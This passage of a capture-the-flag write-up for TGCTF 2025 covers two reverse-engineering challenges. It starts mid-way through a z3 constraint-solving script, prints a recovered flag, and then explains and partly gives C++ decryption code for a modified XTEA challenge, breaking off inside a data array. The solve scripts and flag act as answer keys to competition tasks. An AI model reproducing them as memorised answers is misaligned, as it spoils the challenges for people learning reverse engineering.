+ <span class="number">1</span> * Enc[<span class="number">5</span>] - <span class="number">122</span> * Enc[<span class="number">6</span>]) + <span class="number">21</span> * Enc[<span class="number">7</span>] + <span class="number">32</span> * Enc[<span class="number">8</span>] + <span class="number">3</span> * Enc[<span class="number">9</span>] - <span class="number">10</span> * Enc[<span class="number">10</span>] == <span class="number">4950</span>)</span><br><span class="line">s.add((((<span class="number">13</span> * Enc[<span class="number">0</span>] + <span class="number">66</span> * Enc[<span class="number">1</span>] + <span class="number">29</span> * Enc[<span class="number">2</span>] + <span class="number">39</span> * Enc[<span class="number">3</span>] - <span class="number">33</span> * Enc[<span class="number">4</span>]) + <span class="number">13</span> * Enc[<span class="number">5</span>] - <span class="number">2</span> * Enc[<span class="number">6</span>]) + <span class="number">42</span> * Enc[<span class="number">7</span>] + <span class="number">62</span> * Enc[<span class="number">8</span>] + <span class="number">1</span> * Enc[<span class="number">9</span>] - <span class="number">10</span> * Enc[<span class="number">10</span>]) + <span class="number">11</span> * Enc[<span class="number">11</span>] == <span class="number">12544</span>)</span><br><span class="line">s.add((((<span class="number">23</span> * Enc[<span class="number">0</span>] + <span class="number">6</span> * Enc[<span class="number">1</span>] + <span class="number">29</span> * Enc[<span class="number">2</span>] + <span class="number">3</span> * Enc[<span class="number">3</span>] - <span class="number">3</span> * Enc[<span class="number">4</span>]) + <span class="number">63</span> * Enc[<span class="number">5</span>] - <span class="number">25</span> * Enc[<span class="number">6</span>]) + <span class="number">2</span> * Enc[<span class="number">7</span>] + <span class="number">32</span> * Enc[<span class="number">8</span>] + <span class="number">1</span> * Enc[<span class="number">9</span>] - <span class="number">10</span> * Enc[<span class="number">10</span>]) + <span class="number">11</span> * Enc[<span class="number">11</span>] - <span class="number">12</span> * Enc[<span class="number">12</span>] == <span class="number">6585</span>)</span><br><span class="line">s.add(((((<span class="number">223</span> * Enc[<span class="number">0</span>] + <span class="number">6</span> * Enc[<span class="number">1</span>] - <span class="number">29</span> * Enc[<span class="number">2</span>] - <span class="number">53</span> * Enc[<span class="number">3</span>] - <span class="number">3</span> * Enc[<span class="number">4</span>]) + <span class="number">3</span> * Enc[<span class="number">5</span>] - <span class="number">65</span> * Enc[<span class="number">6</span>]) + <span class="number">0</span> * Enc[<span class="number">7</span>] + <span class="number">36</span> * Enc[<span class="number">8</span>] + <span class="number">1</span> * Enc[<span class="number">9</span>] - <span class="number">15</span> * Enc[<span class="number">10</span>]) + <span class="number">16</span> * Enc[<span class="number">11</span>] - <span class="number">18</span> * Enc[<span class="number">12</span>]) + <span class="number">13</span> * Enc[<span class="number">13</span>] == <span class="number">6893</span>)</span><br><span class="line">s.add(((((<span class="number">29</span> * Enc[<span class="number">0</span>] + <span class="number">13</span> * Enc[<span class="number">1</span>] - <span class="number">9</span> * Enc[<span class="number">2</span>] - <span class="number">93</span> * Enc[<span class="number">3</span>]) + <span class="number">33</span> * Enc[<span class="number">4</span>] + <span class="number">6</span> * Enc[<span class="number">5</span>] + <span class="number">65</span> * Enc[<span class="number">6</span>] + <span class="number">1</span> * Enc[<span class="number">7</span>] - <span class="number">36</span> * Enc[<span class="number">8</span>]) + <span class="number">0</span> * Enc[<span class="number">9</span>] - <span class="number">16</span> * Enc[<span class="number">10</span>]) + <span class="number">96</span> * Enc[<span class="number">11</span>] - <span class="number">68</span> * Enc[<span class="number">12</span>]) + <span class="number">33</span> * Enc[<span class="number">13</span>] - <span class="number">14</span> * Enc[<span class="number">14</span>] == <span class="number">1883</span>)</span><br><span class="line">s.add((((<span class="number">69</span> * Enc[<span class="number">0</span>] + <span class="number">77</span> * Enc[<span class="number">1</span>] - <span class="number">93</span> * Enc[<span class="number">2</span>] - <span class="number">12</span> * Enc[<span class="number">3</span>]) + <span class="number">0</span> * Enc[<span class="number">4</span>] + <span class="number">0</span> * Enc[<span class="number">5</span>] + <span class="number">1</span> * Enc[<span class="number">6</span>] + <span class="number">16</span> * Enc[<span class="number">7</span>] + <span class="number">36</span> * Enc[<span class="number">8</span>] + <span class="number">6</span> * Enc[<span class="number">9</span>] + <span class="number">19</span> * Enc[<span class="number">10</span>] + <span class="number">66</span> * Enc[<span class="number">11</span>] - <span class="number">8</span> * Enc[<span class="number">12</span>]) + <span class="number">38</span> * Enc[<span class="number">13</span>] - <span class="number">16</span> * Enc[<span class="number">14</span>]) + <span class="number">15</span> * Enc[<span class="number">15</span>] == <span class="number">8257</span>)</span><br><span class="line">s.add(((((<span class="number">23</span> * Enc[<span class="number">0</span>] + <span class="number">2</span> * Enc[<span class="number">1</span>] - <span class="number">3</span> * Enc[<span class="number">2</span>] - <span class="number">11</span> * Enc[<span class="number">3</span>]) + <span class="number">12</span> * Enc[<span class="number">4</span>] + <span class="number">24</span> * Enc[<span class="number">5</span>] + <span class="number">1</span> * Enc[<span class="number">6</span>] + <span class="number">6</span> * Enc[<span class="number">7</span>] + <span class="number">14</span> * Enc[<span class="number">8</span>] - <span class="number">0</span> * Enc[<span class="number">9</span>]) + <span class="number">1</span> * Enc[<span class="number">10</span>] + <span class="number">68</span> * Enc[<span class="number">11</span>] - <span class="number">18</span> * Enc[<span class="number">12</span>]) + <span class="number">68</span> * Enc[<span class="number">13</span>] - <span class="number">26</span> * Enc[<span class="number">14</span>]) + <span class="number">15</span> * Enc[<span class="number">15</span>] - <span class="number">16</span> * Enc[<span class="number">16</span>] == <span class="number">5847</span>)</span><br><span class="line">s.add((((((<span class="number">24</span> * Enc[<span class="number">0</span>] + <span class="number">0</span> * Enc[<span class="number">1</span>] - <span class="number">1</span> * Enc[<span class="number">2</span>] - <span class="number">15</span> * Enc[<span class="number">3</span>]) + <span class="number">13</span> * Enc[<span class="number">4</span>] + <span class="number">4</span> * Enc[<span class="number">5</span>] + <span class="number">16</span> * Enc[<span class="number">6</span>] + <span class="number">67</span> * Enc[<span class="number">7</span>] + <span class="number">146</span> * Enc[<span class="number">8</span>] - <span class="number">50</span> * Enc[<span class="number">9</span>]) + <span class="number">16</span> * Enc[<span class="number">10</span>] + <span class="number">6</span> * Enc[<span class="number">11</span>] - <span class="number">1</span> * Enc[<span class="number">12</span>]) + <span class="number">69</span> * Enc[<span class="number">13</span>] - <span class="number">27</span> * Enc[<span class="number">14</span>]) + <span class="number">45</span> * Enc[<span class="number">15</span>] - <span class="number">6</span> * Enc[<span class="number">16</span>]) + <span class="number">17</span> * Enc[<span class="number">17</span>] == <span class="number">18257</span>)</span><br><span class="line">s.add(((((<span class="number">25</span> * Enc[<span class="number">0</span>] + <span class="number">26</span> * Enc[<span class="number">1</span>] - <span class="number">89</span> * Enc[<span class="number">2</span>]) + <span class="number">16</span> * Enc[<span class="number">3</span>] + <span class="number">19</span> * Enc[<span class="number">4</span>] + <span class="number">44</span> * Enc[<span class="number">5</span>] + <span class="number">36</span> * Enc[<span class="number">6</span>] + <span class="number">66</span> * Enc[<span class="number">7</span>] - <span class="number">150</span> * Enc[<span class="number">8</span>] - <span class="number">250</span> * Enc[<span class="number">9</span>]) + <span class="number">166</span> * Enc[<span class="number">10</span>] + <span class="number">126</span> * Enc[<span class="number">11</span>] - <span class="number">11</span> * Enc[<span class="number">12</span>]) + <span class="number">690</span> * Enc[<span class="number">13</span>] - <span class="number">207</span> * Enc[<span class="number">14</span>]) + <span class="number">46</span> * Enc[<span class="number">15</span>] + <span class="number">6</span> * Enc[<span class="number">16</span>] + <span class="number">7</span> * Enc[<span class="number">17</span>] - <span class="number">18</span> * Enc[<span class="number">18</span>] == <span class="number">12591</span>)</span><br><span class="line">s.add((((((<span class="number">5</span> * Enc[<span class="number">0</span>] + <span class="number">26</span> * Enc[<span class="number">1</span>] + <span class="number">8</span> * Enc[<span class="number">2</span>] + <span class="number">160</span> * Enc[<span class="number">3</span>] + <span class="number">9</span> * Enc[<span class="number">4</span>] - <span class="number">4</span> * Enc[<span class="number">5</span>]) + <span class="number">36</span> * Enc[<span class="number">6</span>] + <span class="number">6</span> * Enc[<span class="number">7</span>] - <span class="number">15</span> * Enc[<span class="number">8</span>] - <span class="number">20</span> * Enc[<span class="number">9</span>]) + <span class="number">66</span> * Enc[<span class="number">10</span>] + <span class="number">16</span> * Enc[<span class="number">11</span>] - <span class="number">1</span> * Enc[<span class="number">12</span>]) + <span class="number">690</span> * Enc[<span class="number">13</span>] - <span class="number">20</span> * Enc[<span class="number">14</span>]) + <span class="number">46</span> * Enc[<span class="number">15</span>] + <span class="number">6</span> * Enc[<span class="number">16</span>] + <span class="number">7</span> * Enc[<span class="number">17</span>] - <span class="number">18</span> * Enc[<span class="number">18</span>]) + <span class="number">19</span> * Enc[<span class="number">19</span>] == <span class="number">52041</span>)</span><br><span class="line">s.add(((((((<span class="number">29</span> * Enc[<span class="number">0</span>] - <span class="number">26</span> * Enc[<span class="number">1</span>]) + <span class="number">0</span> * Enc[<span class="number">2</span>] + <span class="number">60</span> * Enc[<span class="number">3</span>] + <span class="number">90</span> * Enc[<span class="number">4</span>] - <span class="number">4</span> * Enc[<span class="number">5</span>]) + <span class="number">6</span> * Enc[<span class="number">6</span>] + <span class="number">6</span> * Enc[<span class="number">7</span>] - <span class="number">16</span> * Enc[<span class="number">8</span>] - <span class="number">21</span> * Enc[<span class="number">9</span>]) + <span class="number">69</span> * Enc[<span class="number">10</span>] + <span class="number">6</span> * Enc[<span class="number">11</span>] - <span class="number">12</span> * Enc[<span class="number">12</span>]) + <span class="number">69</span> * Enc[<span class="number">13</span>] - <span class="number">20</span> * Enc[<span class="number">14</span>] - <span class="number">46</span> * Enc[<span class="number">15</span>]) + <span class="number">65</span> * Enc[<span class="number">16</span>] + <span class="number">0</span> * Enc[<span class="number">17</span>] - <span class="number">1</span> * Enc[<span class="number">18</span>]) + <span class="number">39</span> * Enc[<span class="number">19</span>] - <span class="number">20</span> * Enc[<span class="number">20</span>] == <span class="number">20253</span>)</span><br><span class="line">s.add((((((((<span class="number">45</span> * Enc[<span class="number">0</span>] - <span class="number">56</span> * Enc[<span class="number">1</span>]) + <span class="number">10</span> * Enc[<span class="number">2</span>] + <span class="number">650</span> * Enc[<span class="number">3</span>] - <span class="number">900</span> * Enc[<span class="number">4</span>]) + <span class="number">44</span> * Enc[<span class="number">5</span>] + <span class="number">66</span> * Enc[<span class="number">6</span>] - <span class="number">6</span> * Enc[<span class="number">7</span>] - <span class="number">6</span> * Enc[<span class="number">8</span>] - <span class="number">21</span> * Enc[<span class="number">9</span>]) + <span class="number">9</span> * Enc[<span class="number">10</span>] - <span class="number">6</span> * Enc[<span class="number">11</span>] - <span class="number">12</span> * Enc[<span class="number">12</span>]) + <span class="number">69</span> * Enc[<span class="number">13</span>] - <span class="number">2</span> * Enc[<span class="number">14</span>] - <span class="number">406</span> * Enc[<span class="number">15</span>]) + <span class="number">651</span> * Enc[<span class="number">16</span>] + <span class="number">2</span> * Enc[<span class="number">17</span>] - <span class="number">10</span> * Enc[<span class="number">18</span>]) + <span class="number">69</span> * Enc[<span class="number">19</span>] - <span class="number">0</span> * Enc[<span class="number">20</span>]) + <span class="number">21</span> * Enc[<span class="number">21</span>] == <span class="number">18768</span>)</span><br><span class="line">s.add((((((<span class="number">555</span> * Enc[<span class="number">0</span>] - <span class="number">6666</span> * Enc[<span class="number">1</span>]) + <span class="number">70</span> * Enc[<span class="number">2</span>] + <span class="number">510</span> * Enc[<span class="number">3</span>] - <span class="number">90</span> * Enc[<span class="number">4</span>]) + <span class="number">499</span> * Enc[<span class="number">5</span>] + <span class="number">66</span> * Enc[<span class="number">6</span>] - <span class="number">66</span> * Enc[<span class="number">7</span>] - <span class="number">610</span> * Enc[<span class="number">8</span>] - <span class="number">221</span> * Enc[<span class="number">9</span>]) + <span class="number">9</span> * Enc[<span class="number">10</span>] - <span class="number">23</span> * Enc[<span class="number">11</span>] - <span class="number">102</span> * Enc[<span class="number">12</span>]) + <span class="number">6</span> * Enc[<span class="number">13</span>] + <span class="number">2050</span> * Enc[<span class="number">14</span>] - <span class="number">406</span> * Enc[<span class="number">15</span>]) + <span class="number">665</span> * Enc[<span class="number">16</span>] + <span class="number">333</span> * Enc[<span class="number">17</span>] + <span class="number">100</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">777</span> * Enc[<span class="number">20</span>] + <span class="number">201</span> * Enc[<span class="number">21</span>] - <span class="number">22</span> * Enc[<span class="number">22</span>] == <span class="number">111844</span>)</span><br><span class="line">s.add((((((((<span class="number">1</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">333</span> * Enc[<span class="number">2</span>] + <span class="number">4444</span> * Enc[<span class="number">3</span>] - <span class="number">5555</span> * Enc[<span class="number">4</span>]) + <span class="number">6666</span> * Enc[<span class="number">5</span>] - <span class="number">666</span> * Enc[<span class="number">6</span>]) + <span class="number">676</span> * Enc[<span class="number">7</span>] - <span class="number">660</span> * Enc[<span class="number">8</span>] - <span class="number">22</span> * Enc[<span class="number">9</span>]) + <span class="number">9</span> * Enc[<span class="number">10</span>] - <span class="number">73</span> * Enc[<span class="number">11</span>] - <span class="number">107</span> * Enc[<span class="number">12</span>]) + <span class="number">6</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] - <span class="number">6</span> * Enc[<span class="number">15</span>]) + <span class="number">65</span> * Enc[<span class="number">16</span>] + <span class="number">39</span> * Enc[<span class="number">17</span>] + <span class="number">10</span> * Enc[<span class="number">18</span>] + <span class="number">69</span> * Enc[<span class="number">19</span>] + <span class="number">777</span> * Enc[<span class="number">20</span>] + <span class="number">201</span> * Enc[<span class="number">21</span>] - <span class="number">2</span> * Enc[<span class="number">22</span>]) + <span class="number">23</span> * Enc[<span class="number">23</span>] == <span class="number">159029</span>)</span><br><span class="line">s.add((((<span class="number">520</span> * Enc[<span class="number">0</span>] - <span class="number">222</span> * Enc[<span class="number">1</span>]) + <span class="number">333</span> * Enc[<span class="number">2</span>] + <span class="number">4</span> * Enc[<span class="number">3</span>] - <span class="number">56655</span> * Enc[<span class="number">4</span>]) + <span class="number">6666</span> * Enc[<span class="number">5</span>] + <span class="number">666</span> * Enc[<span class="number">6</span>] + <span class="number">66</span> * Enc[<span class="number">7</span>] - <span class="number">60</span> * Enc[<span class="number">8</span>] - <span class="number">220</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">73</span> * Enc[<span class="number">11</span>] + <span class="number">1007</span> * Enc[<span class="number">12</span>] + <span class="number">7777</span> * Enc[<span class="number">13</span>] + <span class="number">2500</span> * Enc[<span class="number">14</span>] + <span class="number">6666</span> * Enc[<span class="number">15</span>] + <span class="number">605</span> * Enc[<span class="number">16</span>] + <span class="number">390</span> * Enc[<span class="number">17</span>] + <span class="number">100</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">99999</span> * Enc[<span class="number">20</span>] + <span class="number">210</span> * Enc[<span class="number">21</span>] + <span class="number">232</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">24</span> * Enc[<span class="number">24</span>] == <span class="number">2762025</span>)</span><br><span class="line">s.add(((((<span class="number">1323</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">333</span> * Enc[<span class="number">2</span>] + <span class="number">4</span> * Enc[<span class="number">3</span>] - <span class="number">55</span> * Enc[<span class="number">4</span>]) + <span class="number">666</span> * Enc[<span class="number">5</span>] + <span class="number">666</span> * Enc[<span class="number">6</span>] + <span class="number">66</span> * Enc[<span class="number">7</span>] - <span class="number">660</span> * Enc[<span class="number">8</span>] - <span class="number">220</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">100</span> * Enc[<span class="number">12</span>] + <span class="number">777</span> * Enc[<span class="number">13</span>] + <span class="number">2500</span> * Enc[<span class="number">14</span>] + <span class="number">6666</span> * Enc[<span class="number">15</span>] + <span class="number">605</span> * Enc[<span class="number">16</span>] + <span class="number">390</span> * Enc[<span class="number">17</span>] + <span class="number">100</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">9999</span> * Enc[<span class="number">20</span>] + <span class="number">210</span> * Enc[<span class="number">21</span>] + <span class="number">232</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">24</span> * Enc[<span class="number">24</span>]) + <span class="number">25</span> * Enc[<span class="number">25</span>] == <span class="number">1551621</span>)</span><br><span class="line">s.add((((((<span class="number">777</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">6969</span> * Enc[<span class="number">2</span>] + <span class="number">4</span> * Enc[<span class="number">3</span>] - <span class="number">55</span> * Enc[<span class="number">4</span>]) + <span class="number">666</span> * Enc[<span class="number">5</span>] - <span class="number">6</span> * Enc[<span class="number">6</span>]) + <span class="number">96</span> * Enc[<span class="number">7</span>] - <span class="number">60</span> * Enc[<span class="number">8</span>] - <span class="number">220</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">100</span> * Enc[<span class="number">12</span>] + <span class="number">777</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] + <span class="number">666</span> * Enc[<span class="number">15</span>] + <span class="number">65</span> * Enc[<span class="number">16</span>] + <span class="number">90</span> * Enc[<span class="number">17</span>] + <span class="number">100</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">999</span> * Enc[<span class="number">20</span>] + <span class="number">21</span> * Enc[<span class="number">21</span>] + <span class="number">232</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">24</span> * Enc[<span class="number">24</span>]) + <span class="number">25</span> * Enc[<span class="number">25</span>] - <span class="number">26</span> * Enc[<span class="number">26</span>] == <span class="number">948348</span>)</span><br><span class="line">s.add(((((((<span class="number">97</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">6969</span> * Enc[<span class="number">2</span>] + <span class="number">4</span> * Enc[<span class="number">3</span>] - <span class="number">56</span> * Enc[<span class="number">4</span>]) + <span class="number">96</span> * Enc[<span class="number">5</span>] - <span class="number">6</span> * Enc[<span class="number">6</span>]) + <span class="number">96</span> * Enc[<span class="number">7</span>] - <span class="number">60</span> * Enc[<span class="number">8</span>] - <span class="number">20</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">10</span> * Enc[<span class="number">12</span>] + <span class="number">707</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] + <span class="number">666</span> * Enc[<span class="number">15</span>] + -<span class="number">9</span> * Enc[<span class="number">16</span>] + <span class="number">90</span> * Enc[<span class="number">17</span>] + -<span class="number">2</span> * Enc[<span class="number">18</span>] + <span class="number">609</span> * Enc[<span class="number">19</span>] + <span class="number">0</span> * Enc[<span class="number">20</span>] + <span class="number">21</span> * Enc[<span class="number">21</span>] + <span class="number">2</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">24</span> * Enc[<span class="number">24</span>]) + <span class="number">25</span> * Enc[<span class="number">25</span>] - <span class="number">26</span> * Enc[<span class="number">26</span>]) + <span class="number">27</span> * Enc[<span class="number">27</span>] == <span class="number">777044</span>)</span><br><span class="line">s.add((((((<span class="number">177</span> * Enc[<span class="number">0</span>] - <span class="number">22</span> * Enc[<span class="number">1</span>]) + <span class="number">699</span> * Enc[<span class="number">2</span>] + <span class="number">64</span> * Enc[<span class="number">3</span>] - <span class="number">56</span> * Enc[<span class="number">4</span>] - <span class="number">96</span> * Enc[<span class="number">5</span>] - <span class="number">66</span> * Enc[<span class="number">6</span>]) + <span class="number">96</span> * Enc[<span class="number">7</span>] - <span class="number">60</span> * Enc[<span class="number">8</span>] - <span class="number">20</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">10</span> * Enc[<span class="number">12</span>] + <span class="number">707</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] + <span class="number">666</span> * Enc[<span class="number">15</span>] + -<span class="number">9</span> * Enc[<span class="number">16</span>] + <span class="number">0</span> * Enc[<span class="number">17</span>] + -<span class="number">2</span> * Enc[<span class="number">18</span>] + <span class="number">69</span> * Enc[<span class="number">19</span>] + <span class="number">0</span> * Enc[<span class="number">20</span>] + <span class="number">21</span> * Enc[<span class="number">21</span>] + <span class="number">222</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">224</span> * Enc[<span class="number">24</span>]) + <span class="number">25</span> * Enc[<span class="number">25</span>] - <span class="number">26</span> * Enc[<span class="number">26</span>]) + <span class="number">27</span> * Enc[<span class="number">27</span>] - <span class="number">28</span> * Enc[<span class="number">28</span>] == <span class="number">185016</span>)</span><br><span class="line">s.add(((((((<span class="number">77</span> * Enc[<span class="number">0</span>] - <span class="number">2</span> * Enc[<span class="number">1</span>]) + <span class="number">6</span> * Enc[<span class="number">2</span>] + <span class="number">6</span> * Enc[<span class="number">3</span>] - <span class="number">96</span> * Enc[<span class="number">4</span>] - <span class="number">9</span> * Enc[<span class="number">5</span>] - <span class="number">6</span> * Enc[<span class="number">6</span>]) + <span class="number">96</span> * Enc[<span class="number">7</span>] - <span class="number">0</span> * Enc[<span class="number">8</span>] - <span class="number">20</span> * Enc[<span class="number">9</span>]) + <span class="number">99</span> * Enc[<span class="number">10</span>] + <span class="number">3</span> * Enc[<span class="number">11</span>] + <span class="number">10</span> * Enc[<span class="number">12</span>] + <span class="number">707</span> * Enc[<span class="number">13</span>] + <span class="number">250</span> * Enc[<span class="number">14</span>] + <span class="number">666</span> * Enc[<span class="number">15</span>] + -<span class="number">9</span> * Enc[<span class="number">16</span>] + <span class="number">0</span> * Enc[<span class="number">17</span>] + -<span class="number">2</span> * Enc[<span class="number">18</span>] + <span class="number">9</span> * Enc[<span class="number">19</span>] + <span class="number">0</span> * Enc[<span class="number">20</span>] + <span class="number">21</span> * Enc[<span class="number">21</span>] + <span class="number">222</span> * Enc[<span class="number">22</span>] + <span class="number">23</span> * Enc[<span class="number">23</span>] - <span class="number">224</span> * Enc[<span class="number">24</span>]) + <span class="number">26</span> * Enc[<span class="number">25</span>] - -<span class="number">58</span> * Enc[<span class="number">26</span>]) + <span class="number">27</span> * Enc[<span class="number">27</span>] - <span class="number">2</span> * Enc[<span class="number">28</span>]) + <span class="number">29</span> * Enc[<span class="number">29</span>] == <span class="number">130106</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> Enc:</span><br><span class="line">    s.add(x &gt;= <span class="number">32</span>)</span><br><span class="line">    s.add(x &lt;= <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line"></span><br><span class="line">    solution = [m[x].as_long() <span class="keyword">if</span> m[x] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> Enc]</span><br><span class="line">    </span><br><span class="line">    decrypted = decrypt(solution)</span><br><span class="line">    <span class="built_in">print</span>(decrypted)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found&quot;</span>)</span><br></pre></td></tr></table></figure><p>HZNUCTF{ad7fa-76a7-ff6a-fffa-7f7d6a}</p><h2 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h2><p>初始化置种子 srand 了一次，然后这边里面判断是否有调试，然后又 srand 了一遍，可以忽略，种子就是 0x7E8。</p><p>红框处是将输入字符串四个四个一组进行翻转。</p><p><img src="/2025/04/13/TGCTF2025/LcFbbxbB8oLeYkxPI0acu3jPnMd.png"></p><p>InitKey 函数是用 rand 初始化了四个整数 Key。</p><p><img src="/2025/04/13/TGCTF2025/AhYVbAhIAobk91xB8j2cPWAjnad.png"></p><p>XTea 是魔改的，Delta 是靠用户输入传进来的，那么这边 Delta 未知就需要爆破。</p><p><img src="/2025/04/13/TGCTF2025/AhYXbfXq2oKkj0xtpUlc8qldnAe.png"></p><p>题目描述说有点 misc 味，发现附件中还有个 readme 里面的压缩包密码就是标准 Delta，<strong>2654435769 -&gt; 0x9E3779B9</strong></p><p>直接编写解密，使用该 Delta 就可以解出 flag。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> *__fastcall <span class="title">dec</span><span class="params">(<span class="type">int</span> _a1_, <span class="type">unsigned</span> <span class="type">int</span> *_a2_, <span class="type">unsigned</span> <span class="type">int</span> *_a3_, <span class="type">unsigned</span> <span class="type">int</span> _a4_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *result; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v5;      <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6;      <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v7;      <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">    <span class="type">int</span> i;                <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">    v5 = *_a2_;</span><br><span class="line">    v6 = *_a3_;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    v7 = -_a1_ * <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v6 -= (*(DWORD *)(_a4_ + <span class="number">4LL</span> * ((v7 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + v7) ^ (v5 + ((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)));</span><br><span class="line">        v7 += _a1_;</span><br><span class="line">        v5 -= (*(DWORD *)(_a4_ + <span class="number">4LL</span> * (v7 &amp; <span class="number">3</span>)) + v7) ^ (v6 + ((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)));</span><br><span class="line">    &#125;</span><br><span class="line">    *_a2_ = v5;</span><br><span class="line">    result = _a3_;</span><br><span class="line">    *_a3_ = v6;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buffer[] = &#123;</span><br><span class="line">        <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0xCB</span>, <span class="number">0x8C</span>, <span class="number">0x1A</span>, <span class="number">0x74</span>, <span class="number">0xA7</span>, <span class="number">0x09</span>,</span><br><span class="line">        <span class="number">0x8D</span>, <span class="number">0x67</span>, <span class="number">0x3C</span>, <span class="number">0xFB</span>, <span class="number">0x79</span>, <span class="number">0x3A</span>, <span class="number">0x08</span>, <span class="number">0xF6</span>,</span><br><span class="line">        <span class="number">0x1B</span>, <span class="number">0x24</span>, <span class="number">0xCC</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0x59</span>, <span class="number">0xFA</span>, <span class="number">0x39</span>,</span><br><span class="line">        <span 